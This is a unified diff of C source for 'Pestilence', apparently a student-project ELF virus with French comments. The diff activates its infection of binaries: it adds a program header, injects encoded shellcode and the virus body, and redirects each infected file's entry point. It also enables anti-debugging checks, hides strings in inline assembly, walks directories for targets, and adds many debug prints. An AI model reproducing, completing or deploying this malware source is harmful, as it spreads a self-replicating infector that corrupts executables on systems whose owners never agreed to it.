@@ -36,18 +36,23 @@
 #include "pestilence.h"
 #include "func.c"
 
+// debut du code de pestilence
 #ifndef FRENZY
 #define FRENZY 0x401000
 #endif
+// taille du code a injecter
 #ifndef VARAX
 #define VARAX 0x1af6
 #endif
+// position du symbole cyanure
 #ifndef CYANURE
 #define CYANURE 0x40204d
 #endif
+// entry point de pestilence
 #ifndef BUBONIK
 #define BUBONIK 0x402020
 #endif
+// position de la signature
 #ifndef ECHIDNAE
 #define ECHIDNAE 0x401af0
 #endif
@@ -55,18 +60,26 @@
 void _start(void)
 {
 	void *begin_ptr;
+	char  path[11];
+	char *prgm;
 
-	// if (is_debugged() || is_program_running("doom-nukem"))
-	// 	proc_terminate(0);
+	asm volatile("leaq str6(%%rip), %0\n"
+				 "jmp end6\n"
+				 "str6: .ascii \"doom-nukem\\0\"\n"
+				 "end6:\n"
+				 : "=r"(prgm));
+	if (is_debugged() || is_program_running(prgm) > 0)
+		proc_terminate(0);
+	tty_putc(10);
+	tty_putc('W');
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
 					 : "=r"(begin_ptr));
 	begin_ptr += FRENZY - CYANURE;
 
-	// fs_release(1);
-	// fs_release(2);
+	fs_release(1);
+	fs_release(2);
 
-	char path[11];
 	path[0] = '/';
 	path[1] = 't';
 	path[2] = 'm';
@@ -89,7 +102,7 @@ static unsigned char ror4(unsigned char x)
 	return (unsigned char) ((x >> 4) | (x << 4));
 }
 
-static void decode(char *out, const unsigned char *in)
+static void decode(char *out, char *in)
 {
 	unsigned i = 0;
 	while (in[i])
@@ -100,28 +113,48 @@ static void decode(char *out, const unsigned char *in)
 	out[i] = 0;
 }
 
-static const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
-static const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};
-
 static int is_program_running(const char *target)
 {
+	tty_putc('E');
+	char *proc_str;
+	char *comm_str;
+
+	asm volatile("leaq str7(%%rip), %0\n"
+				 "jmp end7\n"
+				 "str7: .byte 0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0\n"
+				 "end7:\n"
+				 : "=r"(proc_str));
+
+	asm volatile("leaq str8(%%rip), %0\n"
+				 "jmp end8\n"
+				 "str8: .byte 0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0\n"
+				 "end8:\n"
+				 : "=r"(comm_str));
+	// const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
+	// const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};
+	tty_putc(10);
 	int	 fd = -1;
 	int	 ret = 0;
 
 	char proc_path[16];
-	decode(proc_path, S_PROC);
+	decode(proc_path, proc_str);
+	io_send(1, proc_path, validate_environment(proc_path));
 
 	fd = fs_handle(proc_path, O_RDONLY | O_DIRECTORY);
 	if (fd < 0)
 		return 0;
-
 	char buf[4096];
+
+	tty_putc('o');
+	tty_putc(10);
 
 	for (;;)
 	{
 		int nread = fs_enumerate(fd, buf, sizeof(buf));
 		if (nread <= 0)
 			break;
+		tty_putc('r');
+		tty_putc(10);
 		for (int bpos = 0; bpos < nread;)
 		{
 			struct linux_dirent64 *d = (void *) (buf + bpos);
@@ -136,7 +169,7 @@ static int is_program_running(const char *target)
 				char path[64];
 				int	 i = 0;
 
-				decode(path, S_PROC);
+				decode(path, proc_str);
 				while (path[i])
 					i++;
 
@@ -145,7 +178,7 @@ static int is_program_running(const char *target)
 					path[i++] = name[j];
 
 				char comm[8];
-				decode(comm, S_COMM);
+				decode(comm, comm_str);
 
 				for (int j = 0; comm[j]; j++)
 					path[i++] = comm[j];
@@ -182,6 +215,8 @@ static int is_program_running(const char *target)
 	}
 
 DONE:
+
+	tty_putc(ret == 0 ? '0' : '1');
 	fs_release(fd);
 	return ret;
 }
@@ -235,7 +270,6 @@ static int is_debugged(void)
 			offset -= (newline - line + 1);
 		}
 	}
-
 	fs_release(f);
 	return 0;
 }
@@ -323,7 +357,7 @@ finalizeSession:
 
 static void processDirectory(char *folder, void *begin_ptr)
 {
-	// return reconcileTopology(folder, begin_ptr);
+	return reconcileTopology(folder, begin_ptr);
 	int					   fd = fs_handle(folder, 0 | 65536);
 
 	char				   buffer[1024];
@@ -389,49 +423,56 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 					  inout char **file_data, inout size_t *enlarging)
 {
 	int fd;
+	int ret;
 
 	*file_data = NULL;
 	fd = fs_handle(path, O_RDWR);
 	if (fd < 0 || io_query(fd, statbuf) < 0)
 		goto error;
+	io_send(1, "after stat\n", 11);
 	if (statbuf->st_size < sizeof(ElfW(Ehdr)))
 		goto error;
+	io_send(1, "after size check\n", 17);
 	*file_data = (void *) rt_vector(9, 0, statbuf->st_size, PROT_READ,
 									MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
 		goto error;
+	io_send(1, "after mmap\n", 11);
 	char  *ALPHA;
 	size_t OMEGA;
-	asm volatile("leaq str4(%%rip), %0\n"
-				 "leaq (end4-str4)(%%rip), %1\n"
-				 "jmp end4\n"
-				 "str4: .ascii \"Pestilence version 1.0 (c)oded by xxxxxxx - "
-				 "yyyyyy\\0\" \n"
-				 "end4:\n"
-				 : "=r"(ALPHA), "=r"(OMEGA));
+	asm volatile(
+		"leaq str4(%%rip), %0\n"
+		"leaq (end4-str4)(%%rip), %1\n"
+		"jmp end4\n"
+		"str4: .ascii \"\\nPestilence version 1.0 (c)oded by xxxxxxx - "
+		"yyyyyy\\0\" \n"
+		"end4:\n"
+		: "=r"(ALPHA), "=r"(OMEGA));
 	int i = 0;
 	while (i + OMEGA < statbuf->st_size)
 		if (!evaluateDriftSignature(*file_data + i++, ALPHA, OMEGA))
 			goto error;
-	// else
-	// {
-	// 	emit_hex(i);
-	// 	tty_putc(10);
-	// }
+	io_send(1, "after signature\n", 16);
 
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	*enlarging = VARAX;
 	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
 	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
 	vm_release(file_data, statbuf->st_size);
-	if (io_resize(fd, statbuf->st_size + *enlarging) < 0)
+	if ((ret = io_resize(fd, statbuf->st_size + *enlarging)) < 0)
+	{
+		emit_hex(ret);
 		goto error;
+	}
+	io_send(1, "after resize\n", 13);
 	*file_data = (void *) rt_vector(9, 0, statbuf->st_size + *enlarging,
 									PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
 		goto error;
+	io_send(1, "map ok\n", 7);
 	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
 		goto error;
+	io_send(1, "after magic check\n", 19);
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	if (statbuf->st_size < elf->header->e_shoff
 							   + elf->header->e_shnum * elf->header->e_shentsize
@@ -439,12 +480,15 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 			   < elf->header->e_phoff
 					 + elf->header->e_phnum * elf->header->e_phentsize)
 		goto error;
+	io_send(1, "after header check\n", 20);
 	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
 	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
 	fs_release(fd);
 	return (OK);
 error:
-	io_send(1, "nop nopnop\n", 12);
+	tty_putc('^');
+	emit_hex(ret);
+	io_send(1, ": nop nopnop\n", 13);
 	fs_release(fd);
 	return (KO);
 }
@@ -474,25 +518,35 @@ static void infect(char *path, void *begin_ptr)
 	size_t flower;
 	size_t enlarging;
 
+	tty_putc(10);
 	io_send(1, path, validate_environment(path));
+	tty_putc(10);
+	tty_putc('I');
 	tty_putc(10);
 	asm volatile(
 		"leaq str3(%%rip), %0\n"
-		"leaq (end3-str3)(%%rip), %1\n"
+		"movq $end3-str3, %1\n"
 		"jmp end3\n"
 		"str3:  .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
 		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xeb, 0xff, "
 		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
 		"end3:\n"
-		: "=r"(curare), "=r"(flower));
-
+		: "=r"(curare), "=r"(flower)::"memory", "cc", "rax", "rcx", "r11");
+	emit_hex((unsigned long long) curare);
+	tty_putc('=');
+	emit_hex((unsigned long long) flower);
+	tty_putc(10);
 	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging))
 		goto clean;
+	tty_putc('p');
+	tty_putc(10);
 	unsigned long append_pos
 		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
 	unsigned long pestis = find_first_free_page(elf);
 	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
 		   elf.header->e_phnum * elf.header->e_phentsize);
+	tty_putc('M');
+	tty_putc(10);
 	elf.header->e_phoff = append_pos;
 	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
 	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
@@ -517,28 +571,34 @@ static void infect(char *path, void *begin_ptr)
 			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
 		}
 	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
+	emit_hex((unsigned long long) file_data + append_pos);
+	tty_putc('_');
+	emit_hex((unsigned long long) curare);
+	tty_putc('=');
+	emit_hex((unsigned long long) flower);
+	tty_putc(10);
 	memcpy(file_data + append_pos, curare, flower);
+	tty_putc('M');
+	tty_putc('2');
+	tty_putc(10);
 	unsigned delta = elf.header->e_entry;
 	elf.header->e_entry
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + ACONIT + 4;
+	tty_putc('w');
+	emit_hex(delta);
+	tty_putc(10);
 	memcpy(file_data + append_pos + ACONIT, &delta, 4);
 	delta = flower - ARSENIC + BUBONIK - FRENZY - 4;
+	tty_putc(')');
+	emit_hex(delta);
+	tty_putc(10);
 	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
 	append_pos += flower;
-	emit_hex((unsigned long long) file_data);
-	tty_putc(10);
-	emit_hex(append_pos);
-	tty_putc(10);
-	emit_hex((unsigned long long) file_data + append_pos);
-	tty_putc(10);
-	// emit_hex(append_pos);
-	// tty_putc(' ');
-	// emit_hex((unsigned long long) begin_ptr);
-	// tty_putc(' ');
-	// emit_hex(VARAX);
-	// tty_putc('\n');
+	emit_hex(VARAX);
+	tty_putc('\n');
 	memcpy(file_data + append_pos, begin_ptr, VARAX);
+	io_send(1, "ol done\n", 8);
 clean:
 	if (file_data)
 		vm_release(file_data, statbuf.st_size + enlarging);
